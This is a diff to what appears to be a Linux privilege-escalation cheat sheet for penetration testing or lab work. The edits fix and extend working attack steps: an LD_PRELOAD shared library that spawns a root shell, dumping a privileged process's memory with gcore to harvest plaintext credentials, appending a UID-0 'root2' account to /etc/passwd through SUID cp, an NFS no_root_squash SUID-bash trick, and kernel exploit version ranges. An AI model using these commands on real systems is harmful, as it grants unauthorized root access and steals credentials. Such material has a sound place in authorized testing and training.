@@ -77,6 +77,7 @@ If `sudo -l` shows `env_keep+=LD_PRELOAD`:
 // File: /tmp/evil.c
 #include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
 void _init() {
     unsetenv("LD_PRELOAD");
     setgid(0);
@@ -93,6 +94,8 @@ sudo LD_PRELOAD=/tmp/evil.so <allowed_binary>
 ### PYTHONPATH / SETENV hijacking
 
 If `env_keep+=PYTHONPATH` or `SETENV` is present, create a malicious Python module with the same name as a module imported by the sudo-allowed script.
+
+### gcore (privileged process memory)
 
 If `gcore` (or `/usr/bin/gcore`) appears in `sudo -l`, dump the memory of a privileged process to get plaintext creds:
 
@@ -120,7 +123,7 @@ find /tmp -exec "/usr/bin/bash" -p \; -quit
 /usr/bin/bash -p          # -p prevents effective UID from being reset
 # SUID cp → overwrite /etc/passwd
 cp /etc/passwd /tmp/passwd.bak
-echo 'root2:$(openssl passwd w00t):0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
+echo "root2:$(openssl passwd w00t):0:0:root:/root:/bin/bash" >> /tmp/passwd.bak
 cp /tmp/passwd.bak /etc/passwd
 ```
 
@@ -187,6 +190,8 @@ To catch hidden root cron jobs, run pspy64:
 ```bash
 chmod +x pspy64 && ./pspy64
 # Watch for UID=0 commands running periodically
+
+# Wildcard injection prep (see the Wildcard Injection section below)
 cp * /media
 
 cd /var/www/target-site/uploads
@@ -489,7 +494,7 @@ If found:
 
 ```bash
 # On attacker (as root):
-sudo mount -t nfs $ip:/share /tmp/nfs
+sudo mount -t nfs <target_ip>:/share /tmp/nfs
 sudo cp /bin/bash /tmp/nfs/bash
 sudo chmod +s /tmp/nfs/bash
 # On target:
@@ -612,13 +617,13 @@ Cross-check before compiling: search `<CVE> <distro> <release> patched` — conf
 
 Major kernel exploits in linux-exploit-suggester.sh:
 
-- DirtyPipe (CVE-2022-0847) — Linux 5.8 – 5.16.11, 5.15.25, 5.10.102
+- DirtyPipe (CVE-2022-0847) — Linux 5.8 ≤ kernel < 5.16.11 (5.15.x < 5.15.25, 5.10.x < 5.10.102)
 - DirtyCow (CVE-2016-5195) — older kernels (< 4.8.3)
 - OverlayFS (CVE-2021-3493 / CVE-2023-0386) — Ubuntu only
 
 - Warning: kernel exploits can crash the box. Exhaust Check 12a first.
 
-## Checks 13-18 — Additional vectors
+## Checks 13–19 — Additional vectors
 
 ```bash
 # 13. World-writable files
